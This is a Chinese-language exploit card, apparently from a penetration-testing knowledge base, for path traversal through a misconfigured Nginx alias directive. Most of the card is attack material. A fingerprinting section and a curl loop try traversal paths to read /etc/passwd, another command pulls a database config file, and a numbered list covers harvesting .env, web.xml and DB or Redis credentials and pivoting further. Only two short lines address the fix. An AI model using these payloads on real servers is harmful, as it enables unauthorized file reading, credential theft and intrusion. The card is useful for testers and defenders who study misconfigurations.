---
title: Nginx alias 路径穿越（读任意文件/源码泄露）
cve: 无（配置缺陷）
severity: high
cvss: 7.8
product: Nginx（location alias 缺尾斜杠）
versions: 任意
ports: 80, 443
keywords: nginx, alias, 穿越, 目录, 源码, 配置
entry: /static../  /files..;/  alias 无 / 结尾
verified: false
sources: 公开资料整理（配置缺陷类）
---

## 指纹

```
GET /static/../etc/passwd     → 403/200
GET /files../WEB-INF/web.xml  → 200 = 命中
```

## 前置条件

- 配置形如 `location /static { alias /data/static/; }`（少一个 `/`）。

## PoC

```bash
# 1) 常见穿越形态
for p in '/static../etc/passwd' '/static/../etc/passwd' '/files../etc/passwd' \
         '/static..%2fetc%2fpasswd' '/static/..%2f..%2fetc%2fpasswd'; do
  echo "$p → $(curl -s -o /tmp/t -w '%{http_code}' "https://target$p") $(head -c 40 /tmp/t | tr -d '\n')"
done
# 判定：返回 root:x:0:0 = 命中

# 2) 读应用配置（拿数据库口令）
curl -s 'https://target/static../app/config/database.php' | head -20
```

## 利用步骤

1. 先探 alias 路径（`/static /files /upload /img`）；
2. 命中后读 `web.xml`、`application.yml`、`.env`；
3. 拿到 DB/Redis 口令 → 转数据库/缓存条目继续；
4. 证据：HTTP 200 + 文件前几行。

## 修复与缓解

- `location /static/ { alias /data/static/; }` 保持尾斜杠一致；或改用 `root`；
- 上传目录禁脚本执行。

## 参考

- Nginx 文档 alias 语义；公开配置错误分析。
